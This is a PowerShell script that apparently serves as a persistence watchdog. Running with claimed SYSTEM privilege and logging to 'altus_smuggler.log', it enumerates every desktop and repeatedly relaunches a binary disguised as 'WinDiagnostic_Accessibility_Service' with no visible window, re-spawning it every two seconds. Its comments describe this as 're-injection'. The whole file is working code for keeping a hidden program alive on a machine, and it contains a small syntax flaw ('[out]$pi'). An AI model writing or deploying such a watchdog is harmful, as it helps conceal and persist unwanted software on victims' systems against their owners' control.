$LogFile = "$env:TEMP\altus_smuggler.log"
function Write-Log($msg) {
    $timestamp = (Get-Date).ToString("HH:mm:ss")
    Add-Content -Path $LogFile -Value "[$timestamp] $msg"
}

Write-Log "=== OMEGA WATCHDOG ACTIVATED (SYSTEM PRIVILEGE) ==="

$Signature = @"
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO {
    public uint cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public uint dwX;
    public uint dwY;
    public uint dwXSize;
    public uint dwYSize;
    public uint dwXCountChars;
    public uint dwYCountChars;
    public uint dwFillAttribute;
    public uint dwFlags;
    public short wShowWindow;
    public short cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION {
    public IntPtr hProcess;
    public IntPtr hThread;
    public uint dwProcessId;
    public uint dwThreadId;
}

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("user32.dll")]
    public static extern bool EnumDesktops(IntPtr hwinstaSID, EnumDesktopProc lpEnumFunc, IntPtr lParam);

    public delegate bool EnumDesktopProc(string lpszDesktop, IntPtr lParam);

    [DllImport("user32.dll")]
    public static extern IntPtr GetProcessWindowStation();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $Signature

# The target app
$exeName = "WinDiagnostic_Accessibility_Service"
$exePath = '"C:\Program Files\WinDiagnostic_Accessibility_Service\WinDiagnostic_Accessibility_Service.exe"'

$global:foundDesktops = New-Object System.Collections.Generic.List[string]
$enumCallback = {
    param($desktopName, $lParam)
    $global:foundDesktops.Add($desktopName)
    return $true
}

while ($true) {
    # GET ALL CURRENTLY RUNNING ALTUS PROCESSES
    $runningAltus = Get-Process -Name $exeName -ErrorAction SilentlyContinue
    
    $global:foundDesktops.Clear()
    $winsta = [Win32]::GetProcessWindowStation()
    [Win32]::EnumDesktops($winsta, $enumCallback, [IntPtr]::Zero) > $null
    
    foreach ($desktop in $global:foundDesktops) {
        if ($desktop -match "Disconnect|Winlogon") { continue }
        
        # Check if Altus is already running on THIS specific desktop station station
        # Since we can't easily map process to desktop name, we rely on a 
        # brute-force re-injection if the total process count is low.
        if ($runningAltus.Count -lt 5) {
            $si = New-Object STARTUPINFO
            $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
            $si.lpDesktop = $desktop
            $pi = New-Object PROCESS_INFORMATION
            
            # 0x08000000 = CREATE_NO_WINDOW
            $success = [Win32]::CreateProcess($null, $exePath, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x08000000, [IntPtr]::Zero, $null, [ref]$si, [out]$pi)
            
            if ($success) {
                Write-Log "WATCHDOG: Reinforcing Altus into desktop -> $desktop"
                [Win32]::CloseHandle($pi.hProcess) > $null
                [Win32]::CloseHandle($pi.hThread) > $null
            }
        }
    }
    
    # High-intensity watchdog check every 2 seconds
    Start-Sleep -Seconds 2
}
